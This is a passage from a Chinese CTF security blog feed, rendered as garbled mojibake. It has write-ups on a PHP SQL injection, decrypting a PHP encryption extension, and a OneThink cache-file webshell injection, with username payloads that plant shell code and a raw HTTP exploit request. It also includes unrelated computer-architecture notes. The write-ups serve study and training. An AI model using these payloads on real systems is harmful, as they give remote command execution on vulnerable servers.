class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;../bwvs_config/sys_config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&#x27;../header.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;</span>.<span class="string">&quot;&#x27;<span class="subst">&#123;$_SESSION[&#x27;user_name&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>,<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Mysql Error!!&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$result</span>[<span class="string">&#x27;DWVS_user_id&#x27;</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>$_SESSION['user_name']</code>ç›´æ¥æ‹¼è¿›å»,é‚£ä¹ˆå°±ä¼šå¯¼è‡´å¼•å·è¢«é—­åˆ,æ³¨å…¥æˆåŠŸ. ä¸è¿‡è¿™é‡Œè¿˜æ˜¯æœ‰å‘,usernameå­—æ®µé•¿åº¦æ˜¯60,å¦‚æœä¸€å¥è¯å¤ªé•¿æ˜¯å†™ä¸è¿›å»çš„ <img src="/images/2018/08/su-6.jpg" alt="blacsheep" /> æ³¨æ„åˆ°å°±å¯ä»¥äº†,æ¯”å¦‚å†™ä¸ªphpinfo <img src="/images/2018/08/su-7.jpg" alt="blacsheep" /> <img src="/images/2018/08/su-8.jpg" alt="blacsheep" /></p><h2 id="hateit">HateIT</h2><p><strong>æè¿°:å¥¶èŒ¶åœ¨ä¸€å®¶äº’è”ç½‘å…¬å¸è¿ç»´ï¼Œç„¶è€Œï¼Œæœ€è¿‘å‡ºäº†ç‚¹é—®é¢˜.... hint:robots.txt</strong> åˆ°robots.txtå‘ç°ä¸€ä¸ª.soæ–‡ä»¶,æ‹–idaåˆ†æä¸€ä¸‹,å‘ç°æ˜¯ä¸ªåŠ å¯†æ–‡ä»¶,ä¸»è¦éƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">zif_suenc_decode</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r14@1</span></span><br><span class="line">  <span class="type">signed</span> __int64 v3; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rbx@2</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx@6</span></span><br><span class="line">  __int64 v6; <span class="comment">// rsi@6</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// [sp+0h] [bp-20h]@1</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+Ch] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  LODWORD(v3) = zend_parse_parameters(a1, <span class="string">&quot;s&quot;</span>, &amp;v8, &amp;v9);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v8;</span><br><span class="line">    LODWORD(v3) = <span class="built_in">memcmp</span>(v8, &amp;suenc_header, <span class="number">0xC</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      *a2 = <span class="number">0LL</span>;</span><br><span class="line">      *(a2 + <span class="number">20</span>) = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v9 - <span class="number">12LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0LL</span> &amp;&amp; v9 != <span class="number">12LL</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="number">0LL</span>;</span><br><span class="line">        v6 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v5 &amp; <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v6 = (v5 + suenc_key[v6] + v6) &amp; <span class="number">0xF</span>;</span><br><span class="line">            *(v4 + v5 + <span class="number">12</span>) = ~(suenc_key[v6] ^ *(v4 + v5 + <span class="number">12</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          ++v5;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v3 != v5 );</span><br><span class="line">        v4 = v8;</span><br><span class="line">      &#125;</span><br><span class="line">      *(v2 + <span class="number">8</span>) = v3;</span><br><span class="line">      *v2 = v4 + <span class="number">12</span>;</span><br><span class="line">      *(v2 + <span class="number">20</span>) = <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•çœ‹ä¸‹ zend_parse_parametersè§£å‚æ•°,è·å¾—å¯†æ–‡åœ°å€v8å’Œé•¿åº¦v9 ç„¶åä»å¯†æ–‡ç¬¬12ä½ä¹‹åä¸€æ¬¡è¿›è¡ŒåŠ å¯† è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">suenc_key = [<span class="number">0x49</span>, <span class="number">0xfa</span>, <span class="number">0x0</span>, <span class="number">0xfa</span>, <span class="number">0x0</span>, <span class="number">0x23</span>, <span class="number">0xff</span>, <span class="number">0x23</span>,\</span><br><span class="line">             <span class="number">0x8e</span>, <span class="number">0xea</span>, <span class="number">0xfa</span>, <span class="number">0xf3</span>, <span class="number">0xa6</span>, <span class="number">0xf3</span>, <span class="number">0xc6</span>, <span class="number">0x8e</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">a1</span>):</span><br><span class="line">    a2 = <span class="built_in">len</span>(a1)</span><br><span class="line">    <span class="keyword">if</span> a2:</span><br><span class="line">        v2 = <span class="number">0</span></span><br><span class="line">        v3 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> a2 != v2:</span><br><span class="line">            <span class="keyword">if</span> v2 &amp; <span class="number">1</span>:</span><br><span class="line">                v3 = (v2 + suenc_key[v3] + v3) &amp; <span class="number">0xf</span></span><br><span class="line">                a1[v2] = ~(suenc_key[v3] ^ a1[v2]) &amp; <span class="number">0xff</span></span><br><span class="line">            v2+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> a1.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;admin.php&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read()</span><br><span class="line">    <span class="built_in">print</span>(decode(<span class="built_in">bytearray</span>(cipher)[<span class="number">12</span>:]))</span><br></pre></td></tr></table></figure><p>ä»è€Œè·å¾—æ‰€æœ‰æºç  ç„¶åè¿™ä¸€éƒ¨åˆ†æ˜¯.soçš„è§£å¯†,ä½†æ˜¯å‘ç°æ²¡æœ‰index.php,ä½†æ˜¯åˆä¸€æ®µopcode,æ‰€ä»¥è‡ªå·±å»è§£å’¯ è‡ªå·±å»è§£äº†ä¸€ä¸‹,è§£äº†ä¸€éƒ¨åˆ†,åé¢çš„è§£ä¸ä¸‹å»äº†... index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//!0 = $username, !1 = $md5, !2 = $admin, !3 = $token, !4 = $sign, !5 = $info</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;func.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$md5</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">get_identify</span>().<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">encrypt</span>(<span class="variable">$username</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$admin</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$md5</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="variable">$md5</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">showImage</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$sign</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;sign+%3A+&#x27;</span>.<span class="variable">$sign</span>.<span class="string">&#x27;%3Cbr%3E%0A&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;token%3A+&#x27;</span>.<span class="variable">$token</span>.<span class="string">&#x27;%3Cbr%3E%0A&#x27;</span>;</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">explode</span>(<span class="title function_ invoke__">decrypt</span>(<span class="variable">$token</span>),<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">decrypt</span>(<span class="variable">$token</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$info</span>) == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">get_identify</span>().<span class="variable">$info</span>[<span class="number">0</span>]) == <span class="variable">$info</span>[<span class="number">2</span>] &amp;&amp; <span class="variable">$sign</span> = <span class="variable">$info</span>[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$admin</span> = <span class="variable">$info</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;sign+%3A+&#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;sign&#x27;</span>].<span class="string">&#x27;%3Cbr%3E%0A&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;token%3A+&#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>].<span class="string">&#x27;%3Cbr%3E%0A&#x27;</span>;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="variable">$sign</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">explode</span>(<span class="title function_ invoke__">decrypt</span>(<span class="variable">$token</span>),<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$info</span>) == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">get_identify</span>().<span class="variable">$info</span>[<span class="number">0</span>]) == <span class="variable">$info</span>[<span class="number">2</span>] &amp;&amp; <span class="variable">$sign</span> = <span class="variable">$info</span>[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$admin</span> = <span class="variable">$info</span>[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;%3Cbr%3E&#x27;</span>.<span class="variable">$admin</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$admin</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$admin</span> == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;auth&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;%3Ca+href%3D%27admin.php%27%3EAdmin%3C%2Fa%3E&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°admin.phpé‡Œé¢çš„å‘½ä»¤æ‰§è¡Œ,åªéœ€è¦ç”Ÿäº§ä¸€ä¸ªadminçš„tokenå°±å¯ä»¥äº†,ä¸è¿‡ç¯å¢ƒçš„åŸå› ,tokenæ€»æ˜¯ç”Ÿæˆå¤±è´¥,åé¢æ‡’å¾—å†™äº†,guguguäº†æ— æ•°å¹´,æŠŠè¿™ç¯‡æ–‡ç« å‘äº†å§,homeworké‚£é¢˜æœ‰æ—¶é—´å†è¡¥å§..</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç»„å­¦ä¹ </title>
      <link href="/2018/07/24/%E8%AE%A1%E7%BB%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/07/24/%E8%AE%A1%E7%BB%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æå‰å­¦ä¹ ä¸€ä¸‹,è™½ç„¶ä¹Ÿåªæ˜¯éšæ„çœ‹ä¸‹,å¼€å­¦å†å›é¡¾ä¸€ä¸‹,è®¡ç»„åº”è¯¥å°±ä¸ä¼šå†å»çœ‹äº†</p><h2 id="ç¬¬ä¸€ç« ">ç¬¬ä¸€ç« </h2><h3 id="å‡ ä¸ªå±‚æ¬¡">å‡ ä¸ªå±‚æ¬¡</h3><blockquote><p>1.åº”ç”¨è½¯ä»¶ ==ç”¨æˆ·æ¥å£,å¦‚GUIä¹‹ç±»== 2.ç³»ç»Ÿè½¯ä»¶(æ“ä½œç³»ç»Ÿ,æ•°æ®æŠ½è±¡[ç¼–è¯‘å™¨,æ±‡ç¼–å™¨,æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç­‰]å’Œèµ„æºæŠ½è±¡[ç³»ç»Ÿè°ƒç”¨]) ==ç³»ç»Ÿæ¥å£== 3.ç¡¬ä»¶ç³»ç»Ÿ(CPU,ä¸»å­˜,è¾“å…¥è¾“å‡º,é€šä¿¡å­ç³»ç»Ÿ) ==I/Oå’Œé€šä¿¡æ¥å£== 4.ç¡¬ä»¶è®¾å¤‡(è¾“å…¥è¾“å‡º,é€šä¿¡è®¾å¤‡)</p></blockquote><h4 id="è½¯ä»¶å±‚">è½¯ä»¶å±‚</h4><p>è½¯ä»¶å±‚å¯åˆ†ä¸ºç³»ç»Ÿè½¯ä»¶å’Œåº”ç”¨è½¯ä»¶ <strong>æ ¸å¿ƒçš„ç³»ç»Ÿè½¯ä»¶</strong>:æ“ä½œç³»ç»Ÿå’Œç¼–è¯‘å™¨</p><h5 id="æ“ä½œç³»ç»Ÿ">æ“ä½œç³»ç»Ÿ</h5><p>æ“ä½œç³»ç»Ÿæ˜¯ç”¨æˆ·ç¨‹åºå’Œç¡¬ä»¶çš„æ¥å£,å®ƒæä¾›æœåŠ¡å’Œç®¡ç†åŠŸèƒ½,å…¶ä¸­æœ€é‡è¦çš„åŠŸèƒ½æœ‰: -- å¤„ç†åŸºæœ¬çš„è¾“å…¥è¾“å‡ºæ“ä½œ -- åˆ†é…å­˜å‚¨ç©ºé—´åŠå†…å­˜ -- ä¸ºå¤šä¸ªç¨‹åºåŒæ—¶ä½¿ç”¨è®¡ç®—æœºæä¾›æ”¯æŒ</p><h5 id="ç¼–è¯‘å™¨">ç¼–è¯‘å™¨</h5><p>å®Œæˆå¦å¤–ä¸€é¡¹æ ¸å¿ƒåŠŸèƒ½,å°†ç”¨é«˜çº§è¯­è¨€,å¦‚c,javaå†™çš„ç¨‹åºç¼–è¯‘æˆç¡¬ä»¶èƒ½å¤Ÿæ‰§è¡Œçš„æŒ‡ä»¤ è½¯ä»¶å±‚æ¬¡æ•´ä½“æ¥çœ‹,ä»é«˜çº§è¯­è¨€åˆ°æœºå™¨è¯­è¨€ -- é«˜çº§è¯­è¨€ç»è¿‡ç¼–è¯‘å™¨è¢«ç¿»è¯‘æˆæ±‡ç¼–è¯­è¨€,è¿™ä¸ªè¿‡ç¨‹æ˜¯ä¸€æ¡é«˜çº§è¯­è¨€å¯¹åº”å¤šæ¡æ±‡ç¼–è¯­è¨€(æŠŠæ±‡ç¼–è½¬æºç å°±æ˜¯é€†å‘å’¯?) -- æ±‡ç¼–è¯­è¨€ç»è¿‡æ±‡ç¼–å™¨è¢«ç¿»è¯‘æˆæœºå™¨è¯­è¨€,å¯¹åº”æ˜¯ä¸€æ¡æ±‡ç¼–è½¬ä¸€æ¡æœºå™¨è¯­è¨€</p><h4 id="ç¡¬ä»¶å±‚">ç¡¬ä»¶å±‚</h4><p>ä¸è¯´äº†,æ”¾å›¾è‡ªå·±ä½“ä¼š...æ„Ÿè§‰åˆè¦å­¦ä¸€é—¨æ•°å­—é€»è¾‘åŠ å¼ºç‰ˆ <img src="/images/2018/07/jizu-1.jpg" alt="blacsheep" /> ç›¸å…³è¯¾ç¨‹çš„å®‰æ’:</p><h5 id="è®¡ç®—æœºä½“ç³»ç»“æ„">è®¡ç®—æœºä½“ç³»ç»“æ„</h5><p>-- ç¨‹åºå‘˜æ‰€è§åˆ°çš„è®¡ç®—æœºç³»ç»Ÿçš„å±æ€§ã€æ¦‚å¿µæ€§çš„ç»“æ„å’ŒåŠŸèƒ½ç‰¹æ€§ -- æŒ‡ä»¤ç³»ç»Ÿã€æ•°æ®ç±»å‹ã€å¯»å€æŠ€æœ¯ã€I/Oæœºç† ä¹Ÿå°±æ˜¯ç ”ç©¶æŒ‡ä»¤<strong>ç³»ç»Ÿ</strong></p><h5 id="è®¡ç®—æœºç»„æˆåŸç†">è®¡ç®—æœºç»„æˆåŸç†</h5><p>-- å®ç°è®¡ç®—æœºä½“ç³»ç»“æ„æ‰€ä½“ç°çš„å±æ€§ -- å…·ä½“æŒ‡ä»¤çš„é€»è¾‘å®ç° ç ”ç©¶æ€ä¹ˆè®¾è®¡<strong>å…·ä½“çš„æŒ‡ä»¤</strong></p><h5 id="é€»è¾‘ä¸æ•°å­—ç³»ç»Ÿ">é€»è¾‘ä¸æ•°å­—ç³»ç»Ÿ</h5><p>-- è®¡ç®—æœºç»„æˆçš„ç‰©ç†å®ç° -- å…·ä½“çš„æŒ‡ä»¤çš„ç‰©ç†å®ç° æ¯”å¦‚ä¹˜æ³•æŒ‡ä»¤éœ€è¦ä¹˜æ³•å™¨,é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬ç ”ç©¶çš„å°±æ˜¯ä¹˜æ³•å™¨çš„ç‰©ç†å®ç°...</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å·…å³°æå®¢webwriteup</title>
      <link href="/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/"/>
      <url>/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2webwriteup/</url>
      
        <content type="html"><![CDATA[<p>å½“å¤©è½¦ä¸Šçœ‹äº†ä¸€ä¼šé¢˜,ç„¶åå›æ¥ç»§ç»­è‚äº†ä¸€ä¼š,å¤ªç´¯äº†ç¡ç€äº†...æ¯”è¾ƒæƒ¨...ä»Šå¤©å°±ç®€å•å¤ç°ä¸€ä¸‹å§</p><h3 id="a-simple-cms">A Simple CMS</h3><p>è¿›å»ä¹‹åå‘ç°æ˜¯oneThinkçš„æ¡†æ¶ <img src="/images/2018/07/geek-1.jpg" alt="blacsheep" /> ç™¾åº¦ä¸€ä¸‹æ¼æ´,å‘ç°æœ‰ä¸ªç¼“å­˜æ´,ç„¶åæˆ‘å°±ç›´æ¥è®¿é—®äº†é‚£ä¸ªç¼“å­˜æ–‡ä»¶,å‘ç°ä¸å­˜åœ¨...ç„¶åå°±æ²¡çœ‹äº†..çœ‹äº†wpå‘ç°å°±æ˜¯ç¼“å­˜åšçš„ä¸è¿‡ç¼“å­˜æ”¹äº†,ç„¶åç»™äº†ä¸ªwww.zipè®©æˆ‘ä»¬çœ‹æ–‡ä»¶..å¯è¿˜è¡Œ.. æ€è·¯å°±æ˜¯ä»¥æ­¤æ³¨å†Œä¸¤ä¸ªè´¦å· <code>%0a$a=$_GET[a];//</code>å’Œ<code>%0aecho `$a `;//</code> ç„¶åå†ä¾æ¬¡ç™»å½•,ç„¶åç¼“å­˜æ–‡ä»¶å°±æœ‰shelläº†,æœ¬åœ°å®éªŒä¸€ä¸‹,ç„¶åå‘ç°æ–‡ä»¶åœ¨<code>Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php</code> ç„¶åå°±getshelläº† burpçš„åŒ…</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=/Home/User/register.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b87051f333804bcda22717be7b65a925c2190c99315c4e0e.game.ichunqiu.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>95</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://b87051f333804bcda22717be7b65a925c2190c99315c4e0e.game.ichunqiu.com</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://b87051f333804bcda22717be7b65a925c2190c99315c4e0e.game.ichunqiu.com/index.php?s=/Home/User/register.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=163bce1a13fc08-098d67d4284b6b-737356c-1fa400-163bce1a140248; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; pgv_pvi=3919248384; pgv_si=s6303365120; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1532146491,1532218918,1532239817; ci_session=e130184c93df8e71c7b9b914a9a57533887d6aeb; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1532267215; PHPSESSID=5umnh4fksrbf55vrvd9aokaik0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">username</span>=%<span class="number">0</span>aecho `$a`;//&amp;password=<span class="number">123321</span>&amp;repassword=<span class="number">123321</span>&amp;email=<span class="number">12344121</span>%<span 